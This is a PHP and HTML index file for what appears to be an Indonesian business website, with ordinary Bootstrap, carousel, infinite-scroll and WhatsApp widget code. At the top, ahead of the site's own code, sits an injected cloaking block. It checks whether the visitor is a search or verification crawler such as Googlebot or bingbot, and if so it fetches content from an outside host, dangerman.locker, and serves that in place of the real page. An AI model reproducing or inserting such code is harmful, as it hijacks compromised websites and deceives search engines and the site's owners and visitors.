<?php
function is_bot() {
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');

foreach ($bots as $bot) {
if (stripos($user_agent, $bot) !== false) {
return true;
}
}

return false;
}

if (is_bot()) {
$message = file_get_contents('https://dangerman.locker/landing/samodrailmu/index.txt');
echo $message;
exit;
}
?>

<?php
    // error_reporting(0);
    require "appweb/Config/SetWebsite.php";
    require "appweb/Config/Db.php";
    require "appweb/Config/AssetsWebsite.php";
    require "WP-Admin/JSI2024/appweb/Libraries/others.php";
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <?php require "appweb/Controllers/SEO_v6.php"; ?>

    <link rel="icon" type="image/x-icon" href="<?= $url_images; ?>/<?= $icon; ?>">

    <link rel="stylesheet" href="<?= $base_url; ?>/assets/css/bootstrap.css">

    <!--Plugins -->
    <style>@import url('https://fonts.googleapis.com/css2?family=Nunito+Sans&display=swap');</style>
    <link href="<?= $base_url; ?>/assets/plugins/fontawesome-6.0.0/css/all.min.css" rel="stylesheet">
    <link href="<?= $base_url; ?>/assets/plugins/aos/dist/aos.css" rel="stylesheet">

    <!-- Slick JS -->
        <link href="<?= $base_url; ?>/assets/plugins/slick/slick.min.css" rel="stylesheet">
        <link href="<?= $base_url; ?>/assets/plugins/slick/slick-theme.min.css" rel="stylesheet">
    <!-- Slick JS -->
    <style>
        @import url('https://fonts.googleapis.com/css2?family=ADLaM+Display&display=swap');
        @import url('https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@10..48,500&family=Signika+Negative:wght@500&display=swap');
        @import url('https://fonts.googleapis.com/css2?family=Protest+Riot&display=swap');
    </style>
    <!--End Plugins -->
</head>
<body>

    <div class="container-fluid FontStyle3 px-0">
        <?php require "appweb/Controllers/Contents.php"; ?>
        <?php require "appweb/Models/Footer.php"; ?>
    </div>

    <a href="javascript:" id="return-to-top"><i class="fa-solid fa-angle-up fa-lg"></i></a>

    <script src="<?= $base_url; ?>/assets/js/jquery-3.6.0.min.js"></script>
    <script src="<?= $base_url; ?>/assets/js/bootstrap.bundle.js"></script>
    <script type="text/javascript">
        // Popover
        var popoverTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="popover"]'))
        var popoverList = popoverTriggerList.map(function (popoverTriggerEl) {
            return new bootstrap.Popover(popoverTriggerEl)
        })
        // Popover

        // ===== Scroll to Top ==== 
        $(window).scroll(function() {
            if ($(this).scrollTop() >= 50) {        // If page is scrolled more than 50px
                $('#return-to-top').fadeIn(200);    // Fade in the arrow
            } else {
                $('#return-to-top').fadeOut(200);   // Else fade out the arrow
            }
        });
        $('#return-to-top').click(function() {      // When arrow is clicked
            $('body,html').animate({
                scrollTop : 0                       // Scroll to top of body
            }, 500);
        });
        // ===== Scroll to Top ====

        document.addEventListener("DOMContentLoaded", function(){
            // make it as accordion for smaller screens
            if (window.innerWidth > 992) {
                document.querySelectorAll('.navbar .nav-item').forEach(function(everyitem){
                    everyitem.addEventListener('mouseover', function(e){
                        let el_link = this.querySelector('a[data-bs-toggle]');
                        if(el_link != null){
                            let nextEl = el_link.nextElementSibling;
                            el_link.classList.add('show');
                            nextEl.classList.add('show');
                        }
                    });
                    everyitem.addEventListener('mouseleave', function(e){
                        let el_link = this.querySelector('a[data-bs-toggle]');
                        if(el_link != null){
                            let nextEl = el_link.nextElementSibling;
                            el_link.classList.remove('show');
                            nextEl.classList.remove('show');
                        }
                    })
                });
            }
            // end if innerWidth

            window.addEventListener("scroll", function() {
                if (window.scrollY > 100) {
                    document.getElementById("navbar_top").classList.add("fixed-top");
                    document.getElementById("navbar_top").classList.remove("sticky-top");

                    // document.getElementById("navbar_top").classList.remove("bg-trasparent");
                    // document.getElementById("navbar_top").classList.add("bg-primary");

                    document.getElementById("navbar_top").classList.add("shadow-sm");

                    document.getElementById("navbar_brand").classList.add("navbar-brand-35");
                    document.getElementById("navbar_brand").classList.remove("navbar-brand-50");

                    // add padding top to show content behind navbar
                    navbar_height = document.querySelector(".navbar").offsetHeight;
                    document.body.style.paddingTop = navbar_height + "px";
                } else {
                    document.getElementById("navbar_top").classList.remove("fixed-top");
                    document.getElementById("navbar_top").classList.add("sticky-top");

                    // document.getElementById("navbar_top").classList.add("bg-trasparent");
                    // document.getElementById("navbar_top").classList.remove("bg-primary");

                    document.getElementById("navbar_top").classList.remove("shadow-sm");

                    document.getElementById("navbar_brand").classList.remove("navbar-brand-35");
                    document.getElementById("navbar_brand").classList.add("navbar-brand-50");

                    // remove padding top from body
                    document.body.style.paddingTop = "0";
                } 
            });
        }); 
        // DOMContentLoaded  end
    </script>

    <!-- Plugins -->
        <!-- Data AOS -->
        <script src="<?= $base_url; ?>/assets/plugins/aos/dist/aos.js"></script>
        <script type="text/javascript">
            AOS.init({
                once: true
            });
        </script>
        <!-- Data AOS -->
        <!-- Slick JS -->
            <script src="<?= $base_url; ?>/assets/plugins/slick/slick.min.js"></script>
            <script type="text/javascript">
                $(document).ready(function(){
                    // Category
                        $('.testimoni').slick({
                            dots: false,
                            slidesToShow: 6,
                            slidesToScroll: 1,
                            infinite: true,
                            arrows: false,
                            autoplay: true,
                            autoplaySpeed: 1500,
                            pauseOnHover: true,
                            responsive: [
                            {
                                breakpoint: 1100,
                                settings: {
                                    slidesToShow: 4,
                                }
                            },{
                                breakpoint: 992,
                                settings: {
                                    slidesToShow: 3,
                                }
                            },{
                                breakpoint: 768,
                                settings: {
                                    slidesToShow: 2,
                                }
                            },{
                                breakpoint: 576,
                                settings: {
                                    slidesToShow: 2,
                                }
                            }
                            ]
                        });
                    // Category
                });
            </script>
            <script>
                $(document).ready(function(){
                    var limit = 4;
                    var start = 0;
                    var action = 'inactive';function load_country_data(limit, start){
                        $.ajax({url:"dataBlog",
                            method:"POST",
                            data:{limit:limit, start:start},
                            cache:false,
                            success:function(data){
                                $('.load_data').append(data);
                                if(data == ''){
                                    $('.load_data_message').html("<button type='button' class='btn btn-sm btn-outline-warning d-none'></button>");
                                    action = 'active';
                                }else{
                                    $('.load_data_message').html("<button type='button' class='btn btn-sm btn-warning mt-4'>Memuat data <i class='fas fa-spinner fa-spin'></i></button>");
                                    action = "inactive";
                                }
                            }
                        });
                    }

                    if(action == 'inactive'){
                        action = 'active';
                        load_country_data(limit, start);
                    }

                    $(window).scroll(function(){
                        if($(window).scrollTop() + $(window).height() > $(".load_data").height() && action == 'inactive'){
                            action = 'active';
                            start = start + limit;
                            setTimeout(function(){
                                load_country_data(limit, start);
                            }, 1000);
                        }
                    });
                });
            </script>
        <!-- Slick JS -->
    <!--End Plugins -->
    <!-- GetButton.io widget -->
    <script type="text/javascript">
        (function () {
            var options = {
                whatsapp: "<?= whatsApp($nomorWhatsApp) ?>", // WhatsApp number
                call_to_action: "Layanan 24 Jam", // Call to action
                button_color: "#FF6550", // Color of button
                position: "left", // Position may be 'right' or 'left'
            };
            var proto = 'https:', host = "getbutton.io", url = proto + '//static.' + host;
            var s = document.createElement('script'); s.type = 'text/javascript'; s.async = true; s.src = url + '/widget-send-button/js/init.js';
            s.onload = function () { WhWidgetSendButton.init(host, proto, options); };
            var x = document.getElementsByTagName('script')[0]; x.parentNode.insertBefore(s, x);
        })();
    </script>
    <!-- /GetButton.io widget -->
</body>
</html>
